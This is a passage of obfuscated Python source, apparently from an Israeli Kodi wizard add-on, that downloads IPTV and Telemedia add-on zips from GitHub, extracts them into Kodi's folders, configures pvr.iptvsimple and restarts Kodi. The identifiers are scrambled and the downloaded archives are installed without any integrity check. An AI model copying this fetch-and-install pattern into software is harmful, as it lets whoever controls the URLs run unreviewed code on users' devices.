                    O000000O00OO000O0 .update (int (O0OO000OO000O0OO0 ),"Downloading "+'iptv',OOOO0OO0000OOOO0O ,OO0OO0O000OO0O0OO )#line:5945
              OO0OOO000000OOOOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5948
              O0O00OO0O00OOOO0O .close ()#line:5951
              extract .all (OO00OO0000O000O00 ,OO0OOO000000OOOOO ,O000000O00OO000O0 )#line:5952
              try :#line:5955
                os .remove (OO00OO0000O000O00 )#line:5956
              except :#line:5958
                pass #line:5959
              O000000O00OO000O0 .close ()#line:5960
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:5963
              OO0OO00O00O0OO0OO ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:5965
              O00OOOO0O0O0O0OO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5966
              O00OO00000O0OOO00 =xbmcgui .DialogProgress ()#line:5967
              O00OO00000O0OOO00 .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5968
              OO00OO0000O000O00 =os .path .join (O00OOOO0O0O0O0OO0 ,'isr.zip')#line:5969
              OO0000OOO00OO0OOO =urllib2 .Request (OO0OO00O00O0OO0OO )#line:5970
              OOOOO00OOO0OO00OO =urllib2 .urlopen (OO0000OOO00OO0OOO )#line:5971
              O000000O00OO000O0 =xbmcgui .DialogProgress ()#line:5973
              O000000O00OO000O0 .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5974
              O000000O00OO000O0 .update (0 )#line:5975
              O0O00OO0O00OOOO0O =open (OO00OO0000O000O00 ,'wb')#line:5977
              try :#line:5979
                O00O0OOO00O000000 =OOOOO00OOO0OO00OO .info ().getheader ('Content-Length').strip ()#line:5980
                O000OO00000O00OOO =True #line:5981
              except AttributeError :#line:5982
                    O000OO00000O00OOO =False #line:5983
              if O000OO00000O00OOO :#line:5985
                    O00O0OOO00O000000 =int (O00O0OOO00O000000 )#line:5986
              OO00O0OO00O0000OO =0 #line:5988
              OOO000000OOOOOOO0 =time .time ()#line:5989
              while True :#line:5990
                    OOOOOO00O0000O00O =OOOOO00OOO0OO00OO .read (8192 )#line:5991
                    if not OOOOOO00O0000O00O :#line:5992
                        sys .stdout .write ('\n')#line:5993
                        break #line:5994
                    OO00O0OO00O0000OO +=len (OOOOOO00O0000O00O )#line:5996
                    O0O00OO0O00OOOO0O .write (OOOOOO00O0000O00O )#line:5997
                    if not O000OO00000O00OOO :#line:5999
                        O00O0OOO00O000000 =OO00O0OO00O0000OO #line:6000
                    if O000000O00OO000O0 .iscanceled ():#line:6001
                       O000000O00OO000O0 .close ()#line:6002
                       try :#line:6003
                        os .remove (OO00OO0000O000O00 )#line:6004
                       except :#line:6005
                        pass #line:6006
                       break #line:6007
                    O0OO000OO000O0OO0 =float (OO00O0OO00O0000OO )/O00O0OOO00O000000 #line:6008
                    O0OO000OO000O0OO0 =round (O0OO000OO000O0OO0 *100 ,2 )#line:6009
                    OO000OO0O0O00000O =OO00O0OO00O0000OO /(1024 *1024 )#line:6010
                    O0000O00OOO0OOO0O =O00O0OOO00O000000 /(1024 *1024 )#line:6011
                    OOOO0OO0000OOOO0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO000OO0O0O00000O ,'teal',O0000O00OOO0OOO0O )#line:6012
                    if (time .time ()-OOO000000OOOOOOO0 )>0 :#line:6013
                      OOO0OOO00O00OO00O =OO00O0OO00O0000OO /(time .time ()-OOO000000OOOOOOO0 )#line:6014
                      OOO0OOO00O00OO00O =OOO0OOO00O00OO00O /1024 #line:6015
                    else :#line:6016
                     OOO0OOO00O00OO00O =0 #line:6017
                    OOOO0O0O0OO0OOO0O ='KB'#line:6018
                    if OOO0OOO00O00OO00O >=1024 :#line:6019
                       OOO0OOO00O00OO00O =OOO0OOO00O00OO00O /1024 #line:6020
                       OOOO0O0O0OO0OOO0O ='MB'#line:6021
                    if OOO0OOO00O00OO00O >0 and not O0OO000OO000O0OO0 ==100 :#line:6022
                        O0O0OO000OOOO0000 =(O00O0OOO00O000000 -OO00O0OO00O0000OO )/OOO0OOO00O00OO00O #line:6023
                    else :#line:6024
                        O0O0OO000OOOO0000 =0 #line:6025
                    OO0OO0O000OO0O0OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO0OOO00O00OO00O ,OOOO0O0O0OO0OOO0O )#line:6026
                    O000000O00OO000O0 .update (int (O0OO000OO000O0OO0 ),"Downloading "+'iptv',OOOO0OO0000OOOO0O ,OO0OO0O000OO0O0OO )#line:6028
              OO0OOO000000OOOOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6031
              O0O00OO0O00OOOO0O .close ()#line:6034
              extract .all (OO00OO0000O000O00 ,OO0OOO000000OOOOO ,O000000O00OO000O0 )#line:6035
              try :#line:6036
                os .remove (OO00OO0000O000O00 )#line:6037
              except :#line:6039
                pass #line:6040
              O000000O00OO000O0 .close ()#line:6041
def iptvkodi17_18 ():#line:6042
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=17 and KODIV <18 :#line:6045
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6046
        xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6047
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:6051
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:6052
              O00O0OOOOO00O0O00 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:6054
              OO0OOOO0O0OOO0OO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6055
              OOO000000O0000OOO =xbmcgui .DialogProgress ()#line:6056
              OOO000000O0000OOO .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:6057
              O000OO0OOO00OOOOO =os .path .join (OO0OOOO0O0OOO0OO0 ,'isr.zip')#line:6058
              OO0O00OO0OO0OOO00 =urllib2 .Request (O00O0OOOOO00O0O00 )#line:6059
              O00OO000000OO0OOO =urllib2 .urlopen (OO0O00OO0OO0OOO00 )#line:6060
              O0O000OOO00OO0O00 =xbmcgui .DialogProgress ()#line:6062
              O0O000OOO00OO0O00 .create ("Downloading","Downloading "+'iptv')#line:6063
              O0O000OOO00OO0O00 .update (0 )#line:6064
              O0O00OOOOO00OO0OO =open (O000OO0OOO00OOOOO ,'wb')#line:6066
              try :#line:6068
                O0O0OO000OOOO0O0O =O00OO000000OO0OOO .info ().getheader ('Content-Length').strip ()#line:6069
                OO0OOO0O00000O000 =True #line:6070
              except AttributeError :#line:6071
                    OO0OOO0O00000O000 =False #line:6072
              if OO0OOO0O00000O000 :#line:6074
                    O0O0OO000OOOO0O0O =int (O0O0OO000OOOO0O0O )#line:6075
              OO00000O0O00O0000 =0 #line:6077
              O00O0000000O0OOO0 =time .time ()#line:6078
              while True :#line:6079
                    OO0O00O0OOO0OOOO0 =O00OO000000OO0OOO .read (8192 )#line:6080
                    if not OO0O00O0OOO0OOOO0 :#line:6081
                        sys .stdout .write ('\n')#line:6082
                        break #line:6083
                    OO00000O0O00O0000 +=len (OO0O00O0OOO0OOOO0 )#line:6085
                    O0O00OOOOO00OO0OO .write (OO0O00O0OOO0OOOO0 )#line:6086
                    if not OO0OOO0O00000O000 :#line:6088
                        O0O0OO000OOOO0O0O =OO00000O0O00O0000 #line:6089
                    if O0O000OOO00OO0O00 .iscanceled ():#line:6090
                       O0O000OOO00OO0O00 .close ()#line:6091
                       try :#line:6092
                        os .remove (O000OO0OOO00OOOOO )#line:6093
                       except :#line:6094
                        pass #line:6095
                       break #line:6096
                    OO0O0OO000O0O0000 =float (OO00000O0O00O0000 )/O0O0OO000OOOO0O0O #line:6097
                    OO0O0OO000O0O0000 =round (OO0O0OO000O0O0000 *100 ,2 )#line:6098
                    OO0O0OOOO000OOO00 =OO00000O0O00O0000 /(1024 *1024 )#line:6099
                    OOO0000OO0O0O0OOO =O0O0OO000OOOO0O0O /(1024 *1024 )#line:6100
                    O00O0OO000O0O0000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0O0OOOO000OOO00 ,'teal',OOO0000OO0O0O0OOO )#line:6101
                    if (time .time ()-O00O0000000O0OOO0 )>0 :#line:6102
                      O000OO00OOO000O0O =OO00000O0O00O0000 /(time .time ()-O00O0000000O0OOO0 )#line:6103
                      O000OO00OOO000O0O =O000OO00OOO000O0O /1024 #line:6104
                    else :#line:6105
                     O000OO00OOO000O0O =0 #line:6106
                    O0000O00OO0OOOOOO ='KB'#line:6107
                    if O000OO00OOO000O0O >=1024 :#line:6108
                       O000OO00OOO000O0O =O000OO00OOO000O0O /1024 #line:6109
                       O0000O00OO0OOOOOO ='MB'#line:6110
                    if O000OO00OOO000O0O >0 and not OO0O0OO000O0O0000 ==100 :#line:6111
                        OO0O0OOO0O0OO0O00 =(O0O0OO000OOOO0O0O -OO00000O0O00O0000 )/O000OO00OOO000O0O #line:6112
                    else :#line:6113
                        OO0O0OOO0O0OO0O00 =0 #line:6114
                    OO00O0O00OOOO0O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O000OO00OOO000O0O ,O0000O00OO0OOOOOO )#line:6115
                    O0O000OOO00OO0O00 .update (int (OO0O0OO000O0O0000 ),"Downloading "+'iptv',O00O0OO000O0O0000 ,OO00O0O00OOOO0O00 )#line:6117
              O00OOOOOO0O0O0O00 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6120
              O0O00OOOOO00OO0OO .close ()#line:6123
              extract .all (O000OO0OOO00OOOOO ,O00OOOOOO0O0O0O00 ,O0O000OOO00OO0O00 )#line:6124
              wiz .kodi17Fix ()#line:6126
              try :#line:6128
                os .remove (O000OO0OOO00OOOOO )#line:6129
              except :#line:6131
                pass #line:6132
              O0O000OOO00OO0O00 .close ()#line:6133
              xbmc .sleep (5000 )#line:6135
              O0O0O00O00O0O00OO ='התקנת לקוח טלוויזיה חיה'#line:6137
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0O00O00O0O00OO ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6138
              resetkodi ()#line:6139
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6140
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:6141
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:6142
              O00O0OOOOO00O0O00 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:6143
              OO0OOOO0O0OOO0OO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6144
              OOO000000O0000OOO =xbmcgui .DialogProgress ()#line:6145
              OOO000000O0000OOO .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:6146
              O000OO0OOO00OOOOO =os .path .join (OO0OOOO0O0OOO0OO0 ,'isr.zip')#line:6147
              OO0O00OO0OO0OOO00 =urllib2 .Request (O00O0OOOOO00O0O00 )#line:6148
              O00OO000000OO0OOO =urllib2 .urlopen (OO0O00OO0OO0OOO00 )#line:6149
              O0O000OOO00OO0O00 =xbmcgui .DialogProgress ()#line:6151
              O0O000OOO00OO0O00 .create ("Downloading","Downloading "+'iptv')#line:6152
              O0O000OOO00OO0O00 .update (0 )#line:6153
              O0O00OOOOO00OO0OO =open (O000OO0OOO00OOOOO ,'wb')#line:6155
              try :#line:6157
                O0O0OO000OOOO0O0O =O00OO000000OO0OOO .info ().getheader ('Content-Length').strip ()#line:6158
                OO0OOO0O00000O000 =True #line:6159
              except AttributeError :#line:6160
                    OO0OOO0O00000O000 =False #line:6161
              if OO0OOO0O00000O000 :#line:6163
                    O0O0OO000OOOO0O0O =int (O0O0OO000OOOO0O0O )#line:6164
              OO00000O0O00O0000 =0 #line:6166
              O00O0000000O0OOO0 =time .time ()#line:6167
              while True :#line:6168
                    OO0O00O0OOO0OOOO0 =O00OO000000OO0OOO .read (8192 )#line:6169
                    if not OO0O00O0OOO0OOOO0 :#line:6170
                        sys .stdout .write ('\n')#line:6171
                        break #line:6172
                    OO00000O0O00O0000 +=len (OO0O00O0OOO0OOOO0 )#line:6174
                    O0O00OOOOO00OO0OO .write (OO0O00O0OOO0OOOO0 )#line:6175
                    if not OO0OOO0O00000O000 :#line:6177
                        O0O0OO000OOOO0O0O =OO00000O0O00O0000 #line:6178
                    if O0O000OOO00OO0O00 .iscanceled ():#line:6179
                       O0O000OOO00OO0O00 .close ()#line:6180
                       try :#line:6181
                        os .remove (O000OO0OOO00OOOOO )#line:6182
                       except :#line:6183
                        pass #line:6184
                       break #line:6185
                    OO0O0OO000O0O0000 =float (OO00000O0O00O0000 )/O0O0OO000OOOO0O0O #line:6186
                    OO0O0OO000O0O0000 =round (OO0O0OO000O0O0000 *100 ,2 )#line:6187
                    OO0O0OOOO000OOO00 =OO00000O0O00O0000 /(1024 *1024 )#line:6188
                    OOO0000OO0O0O0OOO =O0O0OO000OOOO0O0O /(1024 *1024 )#line:6189
                    O00O0OO000O0O0000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0O0OOOO000OOO00 ,'teal',OOO0000OO0O0O0OOO )#line:6190
                    if (time .time ()-O00O0000000O0OOO0 )>0 :#line:6191
                      O000OO00OOO000O0O =OO00000O0O00O0000 /(time .time ()-O00O0000000O0OOO0 )#line:6192
                      O000OO00OOO000O0O =O000OO00OOO000O0O /1024 #line:6193
                    else :#line:6194
                     O000OO00OOO000O0O =0 #line:6195
                    O0000O00OO0OOOOOO ='KB'#line:6196
                    if O000OO00OOO000O0O >=1024 :#line:6197
                       O000OO00OOO000O0O =O000OO00OOO000O0O /1024 #line:6198
                       O0000O00OO0OOOOOO ='MB'#line:6199
                    if O000OO00OOO000O0O >0 and not OO0O0OO000O0O0000 ==100 :#line:6200
                        OO0O0OOO0O0OO0O00 =(O0O0OO000OOOO0O0O -OO00000O0O00O0000 )/O000OO00OOO000O0O #line:6201
                    else :#line:6202
                        OO0O0OOO0O0OO0O00 =0 #line:6203
                    OO00O0O00OOOO0O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O000OO00OOO000O0O ,O0000O00OO0OOOOOO )#line:6204
                    O0O000OOO00OO0O00 .update (int (OO0O0OO000O0O0000 ),"Downloading "+'iptv',O00O0OO000O0O0000 ,OO00O0O00OOOO0O00 )#line:6206
              O00OOOOOO0O0O0O00 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6209
              O0O00OOOOO00OO0OO .close ()#line:6212
              extract .all (O000OO0OOO00OOOOO ,O00OOOOOO0O0O0O00 ,O0O000OOO00OO0O00 )#line:6213
              wiz .kodi17Fix ()#line:6214
              try :#line:6216
                os .remove (O000OO0OOO00OOOOO )#line:6217
              except :#line:6219
                pass #line:6220
              O0O000OOO00OO0O00 .close ()#line:6221
              xbmc .sleep (5000 )#line:6223
              O0O0O00O00O0O00OO ='התקנת לקוח טלוויזיה חיה'#line:6225
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0O00O00O0O00OO ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6226
              resetkodi ()#line:6227
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6229
      if xbmc .getCondVisibility ('system.platform.android')and KODIV <=18 and KODIV >=17 :#line:6230
       xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6231
       xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6232
def iptvidanplus ():#line:6233
    OO0000O00000OOO00 =xbmcaddon .Addon ('plugin.video.idanplus')#line:6234
    OO0000O00000OOO00 .setSetting ('useIPTV','true')#line:6235
    xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.idanplus/?mode=7)")#line:6236
    if KODIV >=17 and KODIV <18 :#line:6239
        O0OO0O0OO000OOOOO ='https://github.com/vip200/victory/blob/master/idanplus17.zip?raw=true'#line:6241
        OO0O00OOO0OO0O00O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6242
        O0OOO00O0000OOOOO =xbmcgui .DialogProgress ()#line:6243
        O0OOO00O0000OOOOO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6244
        O0000000OO00OOO00 =os .path .join (PACKAGES ,'isr.zip')#line:6245
        O0O0000000OOO00O0 =urllib2 .Request (O0OO0O0OO000OOOOO )#line:6246
        OOOOOOO000OOO0O0O =urllib2 .urlopen (O0O0000000OOO00O0 )#line:6247
        O0OOOO0OOO00OOOOO =xbmcgui .DialogProgress ()#line:6249
        O0OOOO0OOO00OOOOO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:6250
        O0OOOO0OOO00OOOOO .update (0 )#line:6251
        OO00O00OO00O00000 =open (O0000000OO00OOO00 ,'wb')#line:6253
        try :#line:6255
          O00OO000O0O0O00O0 =OOOOOOO000OOO0O0O .info ().getheader ('Content-Length').strip ()#line:6256
          OOO000OO0OOO00O0O =True #line:6257
        except AttributeError :#line:6258
              OOO000OO0OOO00O0O =False #line:6259
        if OOO000OO0OOO00O0O :#line:6261
              O00OO000O0O0O00O0 =int (O00OO000O0O0O00O0 )#line:6262
        O00OO00OO0OOO000O =0 #line:6264
        O0OO00OO00O00O000 =time .time ()#line:6265
        while True :#line:6266
              O000O0O00O0O00O0O =OOOOOOO000OOO0O0O .read (8192 )#line:6267
              if not O000O0O00O0O00O0O :#line:6268
                  sys .stdout .write ('\n')#line:6269
                  break #line:6270
              O00OO00OO0OOO000O +=len (O000O0O00O0O00O0O )#line:6272
              OO00O00OO00O00000 .write (O000O0O00O0O00O0O )#line:6273
              if not OOO000OO0OOO00O0O :#line:6275
                  O00OO000O0O0O00O0 =O00OO00OO0OOO000O #line:6276
              if O0OOOO0OOO00OOOOO .iscanceled ():#line:6277
                 O0OOOO0OOO00OOOOO .close ()#line:6278
                 try :#line:6279
                  os .remove (O0000000OO00OOO00 )#line:6280
                 except :#line:6281
                  pass #line:6282
                 break #line:6283
              OOO00O0OOOOOOOO00 =float (O00OO00OO0OOO000O )/O00OO000O0O0O00O0 #line:6284
              OOO00O0OOOOOOOO00 =round (OOO00O0OOOOOOOO00 *100 ,2 )#line:6285
              OOO0OOOOOO0O00000 =O00OO00OO0OOO000O /(1024 *1024 )#line:6286
              OO0OO00O00OO0O000 =O00OO000O0O0O00O0 /(1024 *1024 )#line:6287
              O00OOOOO0000OO0O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO0OOOOOO0O00000 ,'teal',OO0OO00O00OO0O000 )#line:6288
              if (time .time ()-O0OO00OO00O00O000 )>0 :#line:6289
                OO0O00O00OOOO0O00 =O00OO00OO0OOO000O /(time .time ()-O0OO00OO00O00O000 )#line:6290
                OO0O00O00OOOO0O00 =OO0O00O00OOOO0O00 /1024 #line:6291
              else :#line:6292
               OO0O00O00OOOO0O00 =0 #line:6293
              OO0000O0O0OO00000 ='KB'#line:6294
              if OO0O00O00OOOO0O00 >=1024 :#line:6295
                 OO0O00O00OOOO0O00 =OO0O00O00OOOO0O00 /1024 #line:6296
                 OO0000O0O0OO00000 ='MB'#line:6297
              if OO0O00O00OOOO0O00 >0 and not OOO00O0OOOOOOOO00 ==100 :#line:6298
                  OOOO0OO0O0OOOOO0O =(O00OO000O0O0O00O0 -O00OO00OO0OOO000O )/OO0O00O00OOOO0O00 #line:6299
              else :#line:6300
                  OOOO0OO0O0OOOOO0O =0 #line:6301
              OO00OOOO0O00O0OOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0O00O00OOOO0O00 ,OO0000O0O0OO00000 )#line:6302
              O0OOOO0OOO00OOOOO .update (int (OOO00O0OOOOOOOO00 ),O00OOOOO0000OO0O0 ,OO00OOOO0O00O0OOO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:6304
        O0OOOOO00O0OOO00O =xbmc .translatePath (os .path .join ('special://home/'))#line:6307
        OO00O00OO00O00000 .close ()#line:6310
        extract .all (O0000000OO00OOO00 ,O0OOOOO00O0OOO00O ,O0OOOO0OOO00OOOOO )#line:6311
        try :#line:6315
          os .remove (O0000000OO00OOO00 )#line:6316
        except :#line:6317
          pass #line:6318
        wiz .kodi17Fix ()#line:6319
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6320
        time .sleep (10 )#line:6321
        O0000O00OO0OO000O =xbmcaddon .Addon ('pvr.iptvsimple')#line:6322
        O0000O00OO0OO000O .setSetting ('epgTimeShift','1.000000')#line:6323
        O0000O00OO0OO000O .setSetting ('m3uPathType','0')#line:6324
        O0000O00OO0OO000O .setSetting ('epgPathType','0')#line:6325
        O0000O00OO0OO000O .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:6326
        O0000O00OO0OO000O .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus2.m3u')#line:6327
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'הגדרת ערוצי עידן פלוס'),'[COLOR %s]הושלם בהצלחה[/COLOR]'%COLOR2 )#line:6328
        resetkodi ()#line:6329
    if KODIV >=18 :#line:6332
        iptvkodi18idan ()#line:6334
        wiz .kodi17Fix ()#line:6335
        time .sleep (10 )#line:6337
        O0000O00OO0OO000O =xbmcaddon .Addon ('pvr.iptvsimple')#line:6338
        O0000O00OO0OO000O .setSetting ('epgTimeShift','1.000000')#line:6339
        O0000O00OO0OO000O .setSetting ('m3uPathType','0')#line:6340
        O0000O00OO0OO000O .setSetting ('epgPathType','0')#line:6341
        O0000O00OO0OO000O .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:6342
        O0000O00OO0OO000O .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus3.m3u')#line:6343
        OOO000O00OOO000OO ='הגדרת ערוצי עידן פלוס'#line:6344
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO000O00OOO000OO ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6345
        resetkodi ()#line:6346
def iptvsimpldown ():#line:6362
    O0OOO00O00O0000O0 =(IPTV18 )#line:6364
    OO0OOO0000OO0OO00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6365
    OO0OOO000OOO0OOO0 =xbmcgui .DialogProgress ()#line:6366
    OO0OOO000OOO0OOO0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6367
    OO00OOO0OO0OOO000 =os .path .join (PACKAGES ,'isr.zip')#line:6368
    OO0OOOO00OO00O000 =urllib2 .Request (O0OOO00O00O0000O0 )#line:6369
    OOO0O0000O0OO000O =urllib2 .urlopen (OO0OOOO00OO00O000 )#line:6370
    OOO00O0OOOO0000O0 =xbmcgui .DialogProgress ()#line:6372
    OOO00O0OOOO0000O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:6373
    OOO00O0OOOO0000O0 .update (0 )#line:6374
    OOOOO000O0OO0O000 =open (OO00OOO0OO0OOO000 ,'wb')#line:6376
    try :#line:6378
      O0OO000O0O000000O =OOO0O0000O0OO000O .info ().getheader ('Content-Length').strip ()#line:6379
      O00OOO0OOO0OOOOO0 =True #line:6380
    except AttributeError :#line:6381
          O00OOO0OOO0OOOOO0 =False #line:6382
    if O00OOO0OOO0OOOOO0 :#line:6384
          O0OO000O0O000000O =int (O0OO000O0O000000O )#line:6385
    OO0OO0O0OOOO00O0O =0 #line:6387
    O00O0O00OO00OOOO0 =time .time ()#line:6388
    while True :#line:6389
          O0O0O0O00OOO0O00O =OOO0O0000O0OO000O .read (8192 )#line:6390
          if not O0O0O0O00OOO0O00O :#line:6391
              sys .stdout .write ('\n')#line:6392
              break #line:6393
          OO0OO0O0OOOO00O0O +=len (O0O0O0O00OOO0O00O )#line:6395
          OOOOO000O0OO0O000 .write (O0O0O0O00OOO0O00O )#line:6396
          if not O00OOO0OOO0OOOOO0 :#line:6398
              O0OO000O0O000000O =OO0OO0O0OOOO00O0O #line:6399
          if OOO00O0OOOO0000O0 .iscanceled ():#line:6400
             OOO00O0OOOO0000O0 .close ()#line:6401
             try :#line:6402
              os .remove (OO00OOO0OO0OOO000 )#line:6403
             except :#line:6404
              pass #line:6405
             break #line:6406
          OOOOO0O000O00OO0O =float (OO0OO0O0OOOO00O0O )/O0OO000O0O000000O #line:6407
          OOOOO0O000O00OO0O =round (OOOOO0O000O00OO0O *100 ,2 )#line:6408
          OO00O0OOO00OOOOOO =OO0OO0O0OOOO00O0O /(1024 *1024 )#line:6409
          O0OOO0O000O0O00OO =O0OO000O0O000000O /(1024 *1024 )#line:6410
          O000000O0OO0OO0OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO00O0OOO00OOOOOO ,'teal',O0OOO0O000O0O00OO )#line:6411
          if (time .time ()-O00O0O00OO00OOOO0 )>0 :#line:6412
            O00O0OOO00O0OOO0O =OO0OO0O0OOOO00O0O /(time .time ()-O00O0O00OO00OOOO0 )#line:6413
            O00O0OOO00O0OOO0O =O00O0OOO00O0OOO0O /1024 #line:6414
          else :#line:6415
           O00O0OOO00O0OOO0O =0 #line:6416
          O0OO0OOOO0OOO00OO ='KB'#line:6417
          if O00O0OOO00O0OOO0O >=1024 :#line:6418
             O00O0OOO00O0OOO0O =O00O0OOO00O0OOO0O /1024 #line:6419
             O0OO0OOOO0OOO00OO ='MB'#line:6420
          if O00O0OOO00O0OOO0O >0 and not OOOOO0O000O00OO0O ==100 :#line:6421
              O000O0OO00000O0O0 =(O0OO000O0O000000O -OO0OO0O0OOOO00O0O )/O00O0OOO00O0OOO0O #line:6422
          else :#line:6423
              O000O0OO00000O0O0 =0 #line:6424
          OO00000000000OOO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00O0OOO00O0OOO0O ,O0OO0OOOO0OOO00OO )#line:6425
          OOO00O0OOOO0000O0 .update (int (OOOOO0O000O00OO0O ),O000000O0OO0OO0OO ,OO00000000000OOO0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:6427
    O00OOOO0O00O0O00O =xbmc .translatePath (os .path .join ('special://home/'))#line:6430
    OOOOO000O0OO0O000 .close ()#line:6433
    extract .all (OO00OOO0OO0OOO000 ,O00OOOO0O00O0O00O ,OOO00O0OOOO0000O0 )#line:6434
    try :#line:6438
      os .remove (OO00OOO0OO0OOO000 )#line:6439
    except :#line:6440
      pass #line:6441
def telemedia_android5fix ():#line:6442
    OOO00OOO0O0O0OO0O =ADDON .getSetting ('systemtype')#line:6443
    OOOOO000O0O0OO00O =ADDON .getSetting ('teleandro')#line:6444
    if xbmc .getCondVisibility ('system.platform.android')and 'Android 5'in OOO00OOO0O0O0OO0O or OOOOO000O0O0OO00O =='true':#line:6445
        OOO0O0O0OO0OOOOOO ='https://github.com/kodianonymous1/build/blob/master/tele.zip?raw=true'#line:6447
        O0OOOOO000OO0O0OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6448
        O0O0000O000OOO00O =xbmcgui .DialogProgress ()#line:6449
        O0O0000O000OOO00O .create ("[B][COLOR=yellow]מתאים את ההרחבה טלמדיה למערכת ההפעלה שלך[/COLOR][/B]","[B][COLOR=green]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6450
        O000OO0OO0OO000O0 =os .path .join (PACKAGES ,'isr.zip')#line:6451
        O0O0OOOO0OOO00OO0 =urllib2 .Request (OOO0O0O0OO0OOOOOO )#line:6452
        OOOOO00O0O00O00OO =urllib2 .urlopen (O0O0OOOO0OOO00OO0 )#line:6453
        O0OOO0000O0O0OOO0 =xbmcgui .DialogProgress ()#line:6455
        O0OOO0000O0O0OOO0 .create ("[B][COLOR=yellow]מתאים את ההרחבה טלמדיה למערכת ההפעלה שלך[/COLOR][/B]","[B][COLOR=green]מוריד....[/COLOR][/B]")#line:6456
        O0OOO0000O0O0OOO0 .update (0 )#line:6457
        OOO000O00O0000000 =open (O000OO0OO0OO000O0 ,'wb')#line:6459
        try :#line:6461
          OOOOO0O0O000OO0OO =OOOOO00O0O00O00OO .info ().getheader ('Content-Length').strip ()#line:6462
          O0OO00O00O00O0O00 =True #line:6463
        except AttributeError :#line:6464
